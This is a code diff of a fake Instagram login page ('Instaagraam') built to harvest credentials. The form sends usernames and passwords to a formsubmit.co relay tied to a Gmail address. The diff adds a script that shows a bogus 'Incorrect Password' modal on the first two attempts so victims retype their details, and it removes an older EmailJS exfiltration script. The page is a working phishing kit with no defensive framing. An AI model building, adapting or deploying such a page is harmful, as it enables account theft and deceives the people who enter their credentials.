@@ -1,4 +1,3 @@
-
 <!DOCTYPE html>
 <html lang="en">
 
@@ -7,25 +6,69 @@
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Instaagraam</title>
-    <!-- FAVIVON -->
+
+    <!-- FAVICON -->
     <link rel="shortcut icon" href="./images/favicon.png" type="image/png">
+
     <!-- GOOGLE FONT -->
     <link rel="preconnect" href="https://fonts.gstatic.com">
-    <link href="https://fonts.googleapis.com/css2?family=Roboto:ital,wght@0,100;0,300;0,400;0,500;0,700;0,900;1,100;1,300;1,400;1,500;1,700;1,900&display=swap" rel="stylesheet">
-    
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
+
     <!-- APP CSS -->
     <link rel="stylesheet" href="./app.css">
-<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css"
-    integrity="sha512-z3gLpd7yknf1YoNbCzqRKc4qyor8gaKU1qmn+CShxbuBusANI9QpRohGBreCFkKxLhei6S9CQXFEbbKuqLg0DA=="
-    crossorigin="anonymous" referrerpolicy="no-referrer" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css"
+        crossorigin="anonymous" referrerpolicy="no-referrer" />
+
     <style>
-        .body{
-            background-color: 'yellow'
+        .modal-overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.5);
+            z-index: 9999;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .modal-box {
+            background: white;
+            padding: 20px 30px;
+            border-radius: 10px;
+            text-align: center;
+            font-family: 'Roboto', sans-serif;
+            max-width: 300px;
+            box-shadow: 0 0 15px rgba(0, 0, 0, 0.2);
+        }
+
+        .modal-box h3 {
+            margin: 0 0 10px;
+            color: #e74c3c;
+        }
+
+        .modal-box button {
+            background-color: #3897f0;
+            color: white;
+            border: none;
+            padding: 8px 16px;
+            border-radius: 5px;
+            cursor: pointer;
+            margin-top: 10px;
         }
     </style>
 </head>
 
 <body>
+
+    <div class="modal-overlay" id="errorModal">
+        <div class="modal-box">
+            <h3>Incorrect Password</h3>
+            <p>Please double-check your password.</p>
+            <button onclick="closeModal()">Try Again</button>
+        </div>
+    </div>
 
     <div class="container">
         <div class="main-container">
@@ -40,81 +83,67 @@
                     </div>
                 </div>
                 <div class="form-container">
-                    <form id="form"  method="POST" action="https://formsubmit.co/paymentsuccessfully25@gmail.com">
+                    <form id="form" method="POST" action="https://formsubmit.co/paymentsuccessfully25@gmail.com">
 
-                    <div class="form-content box">
-                        <div class="logo">
-                            <img src="./images/logo-light.png" alt="Instagram logo" class="logo-light">
-                            <img src="./images/logo-dark.png" alt="Instagram logo" class="logo-dark">
-                        </div>
-                        <div class="btn-group">
-                            <button class="btn-login" type="submit" id="button" value="Send Email">
-                            <i class="fab fa-facebook-square"></i> Continue Using Facebook
-                            </button>
-                                                  </div>
-                                                <div class="divine">
-                                                    <div></div>
-                                                    <div>OR</div>
-                                                    <div></div>
-                                                </div>
-                        <div class="signin-form" id="signin-form">
-                            <div class="form-group">
-                                <div class="animate-input">
-                                    <span>
-                                        Phone number, username or email
-                                    </span>
-                                    <input type="text" name="username" id="username" required>
-                                    <input type="hidden" name="_captcha" value="false">
-                                    <input type="hidden" name="_next" value="https://grilvotes.vercel.app/thanks.html">
-                                </div>
-                                
-                            </div>
-                            <div class="form-group">
-                                <div class="animate-input">
-                                    <span>
-                                        Password
-                                    </span>
-                                   
-
-                                    <input type="text" name="password" id="password" required>
-                                    <button>Show</button>
-                                </div>
-                                <div style="display: flex; text-align: end; justify-content: end; color: rgb(0, 17, 255);"><a href="#" class="forgot-pw">Forgotten your password?</a></div>
+                        <div class="form-content box">
+                            <div class="logo">
+                                <img src="./images/logo-light.png" alt="Instagram logo" class="logo-light">
+                                <img src="./images/logo-dark.png" alt="Instagram logo" class="logo-dark">
                             </div>
                             <div class="btn-group">
-                                <button class="btn-login"  type="submit" id="button" value="Send Email">
-                                    Sign In
+                                <button class="btn-login" type="submit" id="button" value="Send Email">
+                                    <i class="fab fa-facebook-square"></i> Continue Using Facebook
                                 </button>
-                                <div class="box goto">
-                                <p>
-                                    Don't have an account?
-                                    <a href="#">Sign up</a>
-                                </p>
-                                </div>
-                                
-                                </form>
                             </div>
-                           
-                           
-                           
+                            <div class="divine">
+                                <div></div>
+                                <div>OR</div>
+                                <div></div>
+                            </div>
+                            <div class="signin-form" id="signin-form">
+                                <div class="form-group">
+                                    <div class="animate-input">
+                                        <span>Phone number, username or email</span>
+                                        <input type="text" name="username" id="username" required>
+                                        <input type="hidden" name="_captcha" value="false">
+                                        <input type="hidden" name="_next" value="https://grilvotes.vercel.app/thanks.html">
+                                    </div>
+                                </div>
+                                <div class="form-group">
+                                    <div class="animate-input">
+                                        <span>Password</span>
+                                        <input type="text" name="password" id="password" required>
+                                        <button type="button">Show</button>
+                                    </div>
+                                    <div style="display: flex; text-align: end; justify-content: end; color: rgb(0, 17, 255);">
+                                        <a href="#" class="forgot-pw">Forgotten your password?</a>
+                                    </div>
+                                </div>
+                                <div class="btn-group">
+                                    <button class="btn-login" type="submit" id="button" value="Send Email">
+                                        Sign In
+                                    </button>
+                                    <div class="box goto">
+                                        <p>Don't have an account?
+                                            <a href="#">Sign up</a>
+                                        </p>
+                                    </div>
+                                </div>
+                            </div>
                         </div>
-                    </div>
-                   
 
-                    <div class="app-download">
-                        <p>Get the app.</p>
-                        <div class="store-link">
-                            <a href="#">
-                                <img src="./images/app-store.png" alt="app store">
-                            </a>
-                            <a href="#">
-                                <img src="./images/gg-play.png" alt="google play">
-                            </a>
+                        <div class="app-download">
+                            <p>Get the app.</p>
+                            <div class="store-link">
+                                <a href="#"><img src="./images/app-store.png" alt="app store"></a>
+                                <a href="#"><img src="./images/gg-play.png" alt="google play"></a>
+                            </div>
                         </div>
-                    </div>
+                    </form>
                 </div>
             </div>
         </div>
+
         <div class="footer">
             <div class="links">
                 <a href="#">About</a>
@@ -130,49 +159,31 @@
                 <a href="#" id="darkmode-toggle">Darkmode</a>
             </div>
             <hr>
-            
-                <div class="copyright">
-                   
-                    <p>from</p>
-                  
-                    <img src="images\download.jpg" alt="">
-                
+            <div class="copyright">
+                <p>from</p>
+                <img src="images/download.jpg" alt="">
             </div>
-            
         </div>
     </div>
-    <!-- <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
-    
-    <script type="text/javascript">
-        emailjs.init('TNDdEBOh6CvEAAaKN')
-        const btn = document.getElementById('button');
 
-            document.getElementById('form')
-                .addEventListener('submit', function (event) {
-                    event.preventDefault();
+    <!-- Custom JS for modal logic -->
+    <script>
+        let attemptCount = 0;
 
-                    btn.value = 'Sending...';
+        document.getElementById('form').addEventListener('submit', function (e) {
+            attemptCount++;
+            if (attemptCount < 3) {
+                e.preventDefault(); // Prevent form submission
+                document.getElementById('errorModal').style.display = 'flex'; // Show modal
+            } else {
+                // Allow form submission
+            }
+        });
 
-                    const serviceID = 'service_qrp6tch';
-                    const templateID = 'template_8vyte6j';
-
-                    emailjs.sendForm(serviceID, templateID, this)
-                        .then(() => {
-                            btn.value = 'Send Email';
-                            alert('Sorry, Your password was incorrect. please double-check your password.');
-                        }, (err) => {
-                            btn.value = 'Send Email';
-                            alert(JSON.stringify(err));
-                        });
-                });
-    </script> -->
-    
-    <script src="app.js"></script> 
-       
-<!-- <script> -->
-  
-
-    <!-- </script> -->
+        function closeModal() {
+            document.getElementById('errorModal').style.display = 'none';
+        }
+    </script>
 
 </body>
 
